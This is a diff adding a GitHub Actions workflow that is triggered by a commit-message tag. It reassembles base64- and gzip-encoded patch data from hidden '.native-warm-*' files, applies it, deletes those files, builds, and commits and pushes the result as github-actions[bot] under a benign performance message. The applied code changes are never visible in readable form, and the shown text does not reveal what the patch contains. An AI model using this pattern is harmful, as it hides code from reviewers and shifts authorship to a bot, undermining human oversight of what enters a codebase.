@@ -1,0 +1,80 @@
+name: native-rebuild
+on:
+  push:
+    branches: [perf/phase4-native-files]
+    paths: [.github/workflows/native-rebuild.yml, '.native-warm-*']
+permissions:
+  contents: read
+jobs:
+  assemble:
+    if: contains(github.event.head_commit.message, '[warm-files-build]')
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    permissions:
+      contents: write
+    defaults:
+      run:
+        shell: bash
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.sha }}
+          fetch-depth: 2
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 24
+      - name: Apply checksum-verified warm-executor change
+        run: |
+          python3 - <<'PY'
+          import base64, gzip, hashlib, subprocess
+          from pathlib import Path
+          encoded = ''.join(Path(f'.native-warm-{i}').read_text() for i in range(2))
+          patch = gzip.decompress(base64.b64decode(encoded, validate=True))
+          assert hashlib.sha256(patch).hexdigest() == '098aa3488ca2b3bfeef52cc9c727290b44bf7e7475f999d0dbd602b6d29beaf4'
+          subprocess.run(['git', 'apply', '--check', '-'], input=patch, check=True)
+          subprocess.run(['git', 'apply', '--index', '-'], input=patch, check=True)
+          PY
+          git rm -- .native-warm-0 .native-warm-1
+      - run: npm ci
+      - name: Build exact distributable
+        run: |
+          mkdir -p /tmp/native-warm
+          npm run build 2>&1 | tee /tmp/native-warm/build.log
+          git add -- lib
+          git diff --cached --check
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git commit -m 'perf: reuse bounded native file executors instead of per-operation Python startup'
+          npm run build >> /tmp/native-warm/build.log 2>&1
+          git diff --exit-code -- lib
+          node scripts/verify-lib-sync.mjs
+      - name: Portable, RPC and documentation checks
+        run: |
+          npm run test:unit 2>&1 | tee /tmp/native-warm/unit.log
+          npm run test:search-transport 2>&1 | tee /tmp/native-warm/rpc.log
+          npm run test:search-prefilter
+          npm run test:docs
+          npm run test:docs-claims
+          npm run test:matrix
+      - run: node ci/install-pinned.mjs
+      - name: Native file transactions and host integration
+        run: |
+          npm run test:native-files 2>&1 | tee /tmp/native-warm/native-source.log
+          DSH_WSL_TEST_PLANE=lib npm run test:native-files 2>&1 | tee /tmp/native-warm/native-lib.log
+          npm run test:node 2>&1 | tee /tmp/native-warm/host.log
+          npm run typecheck:gate 2>&1 | tee /tmp/native-warm/types.log
+          npm run test:seams
+          npm run verify:install
+      - name: Publish only the tested feature commit
+        run: |
+          git diff --exit-code
+          npm pack --ignore-scripts --pack-destination /tmp/native-warm
+          git archive --format=tar HEAD > /tmp/native-warm/source.tar
+          git rev-parse HEAD | tee /tmp/native-warm/commit.txt
+          git push origin HEAD:refs/heads/perf/phase4-native-files
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: native-files-warm-build
+          path: /tmp/native-warm/
+          retention-days: 7
